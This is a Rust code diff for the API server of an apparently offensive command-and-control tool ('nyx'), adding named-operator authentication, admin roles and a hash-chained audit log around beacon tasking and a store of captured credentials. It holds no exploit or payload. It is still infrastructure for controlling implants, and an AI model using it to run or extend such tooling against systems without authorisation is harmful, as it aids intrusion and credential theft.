@@ -7,6 +7,8 @@
 //! - `GET  /api/results`       — drain task results for a session (JSON).
 
 pub mod tls;
+pub mod operators;
+pub mod audit;
 
 use std::sync::Arc;
 use std::time::{Instant, SystemTime, UNIX_EPOCH};
@@ -93,6 +95,12 @@ pub struct AppState {
     /// restart — UNLIKE sessions (which are in-memory). Shared across operators:
     /// a cred POSTed by one is visible to all via `GET /api/creds`.
     pub creds: Arc<nyx_store::CredStore>,
+    /// Named-operator registry (Phase 3). Empty = open mode; non-empty gates
+    /// `/api/*` by per-operator `name:secret` (or the `_legacy` NYX_TOKEN).
+    pub operators: Arc<operators::OperatorRegistry>,
+    /// Action audit log (Phase 3). `None` in tests/`AppState::default()`;
+    /// `Some` when the server boots with a log path.
+    pub audit: Option<Arc<audit::AuditWriter>>,
 }
 
 /// A captured inbound TLS fingerprint (JA3 + JA4), keyed by peer addr.
@@ -123,6 +131,8 @@ impl Default for AppState {
             creds: Arc::new(
                 nyx_store::CredStore::open_in_memory().expect("in-memory cred store"),
             ),
+            operators: Arc::new(operators::OperatorRegistry::empty()),
+            audit: None,
         }
     }
 }
@@ -308,6 +318,8 @@ pub fn router(state: Arc<AppState>) -> Router {
         .route("/api/profile", get(get_profile))
         .route("/api/creds", get(list_creds).post(post_creds))
         .route("/api/creds/delete", post(delete_cred))
+        .route("/api/audit", get(get_audit))
+        .route("/api/audit/verify", get(verify_audit))
         .layer(DefaultBodyLimit::max(4 * 1024 * 1024));
 
     beacon_routes.merge(api_routes).with_state(state)
@@ -427,7 +439,7 @@ fn body_bytes(b: Vec<u8>) -> axum::body::Body {
 /// every byte of the shorter input and fold a length-mismatch flag into the
 /// same accumulator, so the work depends only on `min(a.len(), b.len())` and
 /// never on where (or whether) the buffers first differ.
-fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
+pub(crate) fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
     // Fold a length-mismatch flag into the accumulator without branching on it:
     // `same_len` is 0 iff lengths are exactly equal (works for any usize, not
     // just the low byte). OR-ing it into `diff` each iteration means a length
@@ -679,24 +691,59 @@ struct SessionView {
 /// (the API token gates tasking on every active beacon — a side-channel leak is
 /// a serious operational risk).
 fn require_auth(st: &AppState, headers: &HeaderMap) -> Option<Response> {
-    let Some(expected) = &st.api_token else {
-        return None;
-    };
-    let want = format!("Bearer {expected}");
-    let got = headers
-        .get(axum::http::header::AUTHORIZATION)
-        .and_then(|h| h.to_str().ok());
-    // Constant-time comparison: compare lengths then XOR-accumulate all bytes.
-    // A timing attacker learns nothing about how many leading bytes matched.
-    let ok = match got {
-        Some(g) => constant_time_eq(want.as_bytes(), g.as_bytes()),
-        None => false,
-    };
-    if ok {
-        None
-    } else {
-        Some(StatusCode::UNAUTHORIZED.into_response())
+    // Delegates to `authenticate` so the named-operator registry (Phase 3) gates
+    // the read-only handlers identically to the write handlers. `authenticate`
+    // encodes the full precedence: registry → legacy token → open.
+    match authenticate(st, headers) {
+        AuthOutcome::Allowed(_) => None,
+        AuthOutcome::Denied(r) => Some(r),
     }
+}
+
+/// Phase 3 auth outcome: either a resolved operator identity or a 401 response.
+enum AuthOutcome {
+    Allowed(operators::OperatorIdentity),
+    Denied(Response),
+}
+
+/// Resolve a request to a named operator identity (Phase 3). Precedence:
+/// (1) a non-empty operator registry → `name:secret` (or bare token → `_legacy`);
+/// (2) else the legacy shared `NYX_TOKEN` (constant-time, identity `_legacy`);
+/// (3) else open mode (identity `_anonymous`). `require_auth` is retained for
+/// the read-only handlers that don't need attribution in v1.
+fn authenticate(st: &AppState, headers: &HeaderMap) -> AuthOutcome {
+    let bearer_val = headers
+        .get(axum::http::header::AUTHORIZATION)
+        .and_then(|h| h.to_str().ok())
+        .map(|s| s.to_string());
+    // (1) Multi-operator registry (loaded from NYX_OPERATORS_FILE / bootstrapped).
+    if !st.operators.is_open() {
+        let bearer = bearer_val.as_deref().and_then(|s| s.strip_prefix("Bearer "));
+        return match bearer {
+            Some(b) => match st.operators.resolve(b) {
+                Some(op) => AuthOutcome::Allowed(op),
+                None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
+            },
+            None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
+        };
+    }
+    // (2) Legacy single shared token.
+    if let Some(expected) = &st.api_token {
+        let want = format!("Bearer {expected}");
+        let presented = bearer_val.as_deref().unwrap_or("");
+        if constant_time_eq(want.as_bytes(), presented.as_bytes()) {
+            return AuthOutcome::Allowed(operators::OperatorIdentity {
+                name: "_legacy".into(),
+                role: operators::Role::Admin,
+            });
+        }
+        return AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response());
+    }
+    // (3) Open (dev/CI).
+    AuthOutcome::Allowed(operators::OperatorIdentity {
+        name: "_anonymous".into(),
+        role: operators::Role::Admin,
+    })
 }
 
 async fn list_sessions(
@@ -887,9 +934,10 @@ async fn post_task(
     headers: HeaderMap,
     Json(req): Json<TaskReq>,
 ) -> Response {
-    if let Some(r) = require_auth(&st, &headers) {
-        return r;
-    }
+    let op = match authenticate(&st, &headers) {
+        AuthOutcome::Allowed(o) => o,
+        AuthOutcome::Denied(r) => return r,
+    };
     let id = match parse_session_hex(&req.session) {
         Some(id) => id,
         None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
@@ -920,7 +968,16 @@ async fn post_task(
         Command::Connect { chan, .. } => Some(*chan),
         _ => None,
     };
+    let cmd_name = command_name(&command);
     s.pending.push(Task { task_id, command });
+    if let Some(audit) = &st.audit {
+        audit.append(
+            "task",
+            &op.name,
+            &req.session,
+            serde_json::json!({ "task_id": task_id, "command": cmd_name }),
+        );
+    }
     (StatusCode::OK, Json(TaskAck { task_id, chan })).into_response()
 }
 
@@ -1056,18 +1113,29 @@ async fn post_creds(
     headers: HeaderMap,
     Json(rec): Json<nyx_store::CredRecord>,
 ) -> Response {
-    if let Some(r) = require_auth(&st, &headers) {
-        return r;
-    }
+    let op = match authenticate(&st, &headers) {
+        AuthOutcome::Allowed(o) => o,
+        AuthOutcome::Denied(r) => return r,
+    };
     match st.creds.upsert(&rec) {
-        Ok(()) => (
-            StatusCode::OK,
-            Json(serde_json::json!({
-                "ok": true,
-                "key": [rec.realm, rec.user, rec.kind.label()]
-            })),
-        )
-            .into_response(),
+        Ok(()) => {
+            if let Some(audit) = &st.audit {
+                audit.append(
+                    "cred_add",
+                    &op.name,
+                    &format!("{}\\{}", rec.realm, rec.user),
+                    serde_json::json!({ "kind": rec.kind.label() }),
+                );
+            }
+            (
+                StatusCode::OK,
+                Json(serde_json::json!({
+                    "ok": true,
+                    "key": [rec.realm, rec.user, rec.kind.label()]
+                })),
+            )
+                .into_response()
+        }
         Err(e) => {
             tracing::error!(error = %e, "cred store upsert failed");
             (StatusCode::INTERNAL_SERVER_ERROR, format!("cred store: {e}")).into_response()
@@ -1089,24 +1157,81 @@ async fn delete_cred(
     headers: HeaderMap,
     Json(key): Json<CredKey>,
 ) -> Response {
-    if let Some(r) = require_auth(&st, &headers) {
-        return r;
-    }
+    let op = match authenticate(&st, &headers) {
+        AuthOutcome::Allowed(o) => o,
+        AuthOutcome::Denied(r) => return r,
+    };
     let kind = match nyx_store::CredKind::from_label(&key.kind) {
         Some(k) => k,
         None => return (StatusCode::BAD_REQUEST, "bad kind").into_response(),
     };
     match st.creds.delete(&key.realm, &key.user, kind) {
-        Ok(deleted) => (
-            StatusCode::OK,
-            Json(serde_json::json!({ "deleted": deleted })),
-        )
-            .into_response(),
+        Ok(deleted) => {
+            if let Some(audit) = &st.audit {
+                audit.append(
+                    "cred_delete",
+                    &op.name,
+                    &format!("{}\\{}", key.realm, key.user),
+                    serde_json::json!({ "kind": kind.label(), "deleted": deleted }),
+                );
+            }
+            (
+                StatusCode::OK,
+                Json(serde_json::json!({ "deleted": deleted })),
+            )
+                .into_response()
+        }
         Err(e) => {
             tracing::error!(error = %e, "cred store delete failed");
             (StatusCode::INTERNAL_SERVER_ERROR, format!("cred store: {e}")).into_response()
         }
     }
+}
+
+/// `GET /api/audit` — query the action audit log. Admin-only for the full log;
+/// a non-admin operator is restricted to their OWN records (server-enforced
+/// regardless of the `?operator=` query). 401 on no/bad auth.
+async fn get_audit(
+    State(st): State<Arc<AppState>>,
+    headers: HeaderMap,
+    Query(mut q): Query<audit::AuditQuery>,
+) -> Response {
+    let op = match authenticate(&st, &headers) {
+        AuthOutcome::Allowed(o) => o,
+        AuthOutcome::Denied(r) => return r,
+    };
+    let Some(audit) = &st.audit else {
+        return (StatusCode::OK, Json(Vec::<audit::AuditRecord>::new())).into_response();
+    };
+    if op.role != operators::Role::Admin {
+        q.operator = Some(op.name.clone());
+    }
+    match audit.query(&q) {
+        Ok(rows) => (StatusCode::OK, Json(rows)).into_response(),
+        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response(),
+    }
+}
+
+/// `GET /api/audit/verify` — walk the hash-chain. `{ "ok": bool, "broken_at": Option<u64> }`.
+async fn verify_audit(
+    State(st): State<Arc<AppState>>,
+    headers: HeaderMap,
+) -> Response {
+    if let AuthOutcome::Denied(r) = authenticate(&st, &headers) {
+        return r;
+    }
+    let Some(audit) = &st.audit else {
+        return (StatusCode::OK, Json(serde_json::json!({ "ok": true }))).into_response();
+    };
+    let broken = match audit::AuditWriter::verify_chain(audit.path()) {
+        Ok(b) => b,
+        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response(),
+    };
+    (
+        StatusCode::OK,
+        Json(serde_json::json!({ "ok": broken.is_none(), "broken_at": broken })),
+    )
+        .into_response()
 }
 
 /// Short name for a wire [`Command`] variant (for operator-facing views).
